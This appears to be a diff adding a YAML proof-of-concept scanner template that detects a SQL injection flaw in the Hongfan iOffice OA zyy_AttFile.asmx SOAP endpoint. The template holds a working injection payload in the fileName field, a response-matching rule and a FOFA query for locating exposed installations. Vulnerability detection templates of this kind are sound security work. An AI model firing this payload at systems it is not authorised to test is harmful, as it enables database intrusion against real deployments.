@@ -1,0 +1,37 @@
+id: poc-yaml-hongfan-ioffice-zyy-attfile-asmx-sqli
+info:
+  name: 红帆OA zyy_AttFile.asmx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: iOffice
+  fofa: app="红帆-ioffice"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /ioffice/prg/interface/zyy_AttFile.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    Soapaction: '"http://tempuri.org/GetFileAtt"'
+  data: '<?xml version="1.0" encoding="utf-8"?><soap:Envelope
+
+    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+
+    xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+
+    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetFileAtt
+
+    xmlns="http://tempuri.org/"><fileName>1231=sys.fn_varbintohexstr(hashbytes(''MD5'',''{{.t1}}''))</fileName></GetFileAtt>
+    </soap:Body></so
+
+    ap:Envelope>'
+  expression: 'contains(body,"nvarchar") &&
+
+    contains(body,"转换成数据类型 int 时失败") &&
+
+    contains(body,t2)
+
+    '
+transport: http
